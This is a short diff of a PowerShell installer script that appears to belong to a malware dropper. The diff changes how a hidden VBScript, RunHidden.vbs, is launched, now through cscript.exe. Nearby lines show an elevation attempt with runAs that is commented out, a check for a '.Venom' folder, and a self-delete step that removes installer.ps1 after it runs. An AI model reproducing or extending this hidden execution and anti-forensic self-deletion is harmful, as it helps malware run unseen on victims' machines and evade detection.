@@ -105,7 +105,7 @@ mv $path\RunHidden.vbs $initial_dir
 
 Start-Sleep -Seconds 30
 
-./RunHidden.vbs
+
 
 # Run the wrapper script to execute RunHidden.vbs with elevated privileges
 #Start-Process powershell -ArgumentList "-File `"$runHiddenWrapperPath`" -vbsPath `"$initial_dir\RunHidden.vbs`"" -Verb runAs
@@ -231,7 +231,7 @@ if (Test-Path -Path '.Venom' -PathType Container) {
 # self delete
 cd $initial_dir
 
-
+Start-Process "cscript.exe" "RunHidden.vbs"
 
 del installer.ps1
 
